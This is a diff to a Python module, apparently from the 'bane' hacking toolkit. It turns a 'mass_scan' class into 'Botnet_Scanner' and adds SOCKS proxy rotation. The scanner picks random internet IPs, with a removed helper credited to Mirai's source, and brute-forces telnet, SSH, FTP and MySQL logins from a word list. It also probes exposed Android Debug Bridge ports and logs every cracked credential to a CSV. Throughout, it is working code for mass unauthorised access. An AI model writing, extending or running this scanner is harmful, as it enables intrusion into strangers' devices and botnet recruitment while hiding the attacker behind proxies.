@@ -1,46 +1,11 @@
 import os, sys, socket, random, time, threading, xtelnet
 from bane.common.payloads import *
-from bane.scanners.vulnerabilities.vulns import adb_exploit, exposed_telnet
-from ftplib import FTP
+from bane.scanners.vulnerabilities.adb_exploit import *
 
 from bane.bruteforce.hydra import *
-from bane.utils.handle_files import write_file
+from bane.utils.pager.rand_generator import *
+from bane.utils.handle_files import *
 
-
-def getip():
-    """
-    this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce."""
-    d = [3, 6, 7, 10, 11, 15, 16, 21, 22, 23, 26, 28, 29, 30, 33, 55, 56, 127, 214, 215]
-    f = [100, 169, 172, 198]
-    while True:
-        o1 = random.randint(1, 253)
-        o2 = random.randint(0, 254)
-        if o1 not in d:
-            if o1 in f:
-                if (o1 == 192) and (o2 != 168):
-                    return "{}.{}.{}.{}".format(
-                        o1, o2, random.randint(0, 255), random.randint(0, 255)
-                    )
-                if (o1 == 172) and ((o2 <= 16) and (o2 >= 32)):
-                    return "{}.{}.{}.{}".format(
-                        o1, o2, random.randint(0, 255), random.randint(0, 255)
-                    )
-                if (o1 == 100) and (o2 != 64):
-                    return "{}.{}.{}.{}".format(
-                        o1, o2, random.randint(0, 255), random.randint(0, 255)
-                    )
-                if (o1 == 169) and (o2 != 254):
-                    return "{}.{}.{}.{}".format(
-                        o1, o2, random.randint(0, 255), random.randint(0, 255)
-                    )
-                if (o1 == 198) and (o2 != 18):
-                    return "{}.{}.{}.{}".format(
-                        o1, o2, random.randint(0, 255), random.randint(0, 255)
-                    )
-            else:
-                return "{}.{}.{}.{}".format(
-                    o1, o2, random.randint(0, 255), random.randint(0, 255)
-                )
 
 
 """
@@ -49,7 +14,8 @@ def getip():
 """
 
 
-class mass_scan:
+class Botnet_Scanner:
+    
     def __init__(
         self,
         file_name="results.csv",
@@ -62,8 +28,14 @@ class mass_scan:
         ip_range=None,
         timeout=7,
         p=23,
+        socks4_proxies=None,
+        socks5_proxies=None,
     ):
-        self.word_list = word_list
+        self.proxies=Proxies_Interface.get_socket_proxies_from_parameters(socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
+        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
+        if self.proxies==[]:
+            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
+        self.word_list=Userful_Utilities.load_word_list(word_list)
         self.logs = logs
         self.protocol = protocol.lower()
         self.stop = False
@@ -74,7 +46,7 @@ class mass_scan:
         self.telnet_bots = telnet_bots
         self.file_name = file_name
         if os.path.exists(self.file_name) == False:
-            write_file("protocol,ip,port,username,password", self.file_name)
+            Files_Interface.write_file("protocol,ip,port,username,password", self.file_name)
         for x in range(threads):
             t = threading.Thread(target=self.scan)
             t.daemon = threads_daemon
@@ -88,7 +60,7 @@ class mass_scan:
                     if self.stop == True:
                         break
                     if self.ip_range == None:
-                        ip = getip()
+                        ip = RANDOM_GENERATOR.get_safe_random_ip()
                     else:
                         ip = self.ip_range.format(
                             random.randint(0, 255),
@@ -98,7 +70,24 @@ class mass_scan:
                         )
                     i = False
                     try:
-                        so = socket.socket()
+                        so = socks.socksocket()
+                        pr=random.choice(self.proxies)
+                        if pr['proxy_type'] in ['socks4','s4']:
+                            so.set_proxy(
+                                proxy_type=socks.SOCKS4,
+                                addr=pr['proxy_host'],
+                                port=pr['proxy_port'],
+                                username=pr['proxy_username'],
+                                password=pr['proxy_password'],
+                            )
+                        elif pr['proxy_type'] in ['socks5','s5']:
+                            so.set_proxy(
+                                proxy_type=socks.SOCKS5,
+                                addr=pr['proxy_host'],
+                                port=pr['proxy_port'],
+                                username=pr['proxy_username'],
+                                password=pr['proxy_password'],
+                            )
                         so.settimeout(self.timeout)
                         so.connect((ip, self.port))
                         i = True
@@ -109,23 +98,24 @@ class mass_scan:
                         break
                     if i == True:
                         if self.protocol == "adb":
-                            q = adb_exploit(ip, timeout=self.timeout, p=self.port)
+                            q = ADB_Exploit_Scanner.scan(ip, timeout=self.timeout, p=self.port)
                             if q == True:
                                 res = "adb:{}:{}::".format(ip, self.port)
-                                write_file(res, self.file_name)
+                                Files_Interface.write_file(res, self.file_name)
                                 self.result.append(res)
                                 if self.logs == True:
                                     print(res)
                         else:
                             if self.protocol == "ssh":
-                                func = ssh
+                                func = Services_Login.ssh
                             elif self.protocol == "telnet":
-                                func = telnet
+                                func = Services_Login.telnet
                             elif self.protocol == "ftp":
-                                func = ftp
+                                func = Services_Login.ftp
                             elif self.protocol == "mysql":
-                                func = mysql
+                                func = Services_Login.mysql
                             for x in self.word_list:
+                                proxy=random.choice(self.proxies)
                                 if self.stop == True:
                                     break
                                 try:
@@ -142,6 +132,7 @@ class mass_scan:
                                             timeout=self.timeout,
                                             p=self.port,
                                             bot_mode=True,
+                                            **proxy
                                         )
                                     else:
                                         q = func(
@@ -150,6 +141,7 @@ class mass_scan:
                                             password,
                                             timeout=self.timeout,
                                             p=self.port,
+                                            **proxy
                                         )
                                     if q == True:
                                         res = "{},{},{},{},{}".format(
@@ -159,13 +151,14 @@ class mass_scan:
                                             username,
                                             password,
                                         )
-                                        write_file(res, self.file_name)
+                                        Files_Interface.write_file(res, self.file_name)
                                         self.result.append(res)
                                         if self.logs == True:
                                             print(res)
                                         break
-                                except:
-                                    pass
+                                except Exception as exx:
+                                    if 'timeout' in str(exx).lower() or 'a telnet service' in str(exx).lower() or 'timed out'  in str(exx).lower() or "connect"  in str(exx).lower():
+                                        break
                 except:
                     pass
             self.kill()
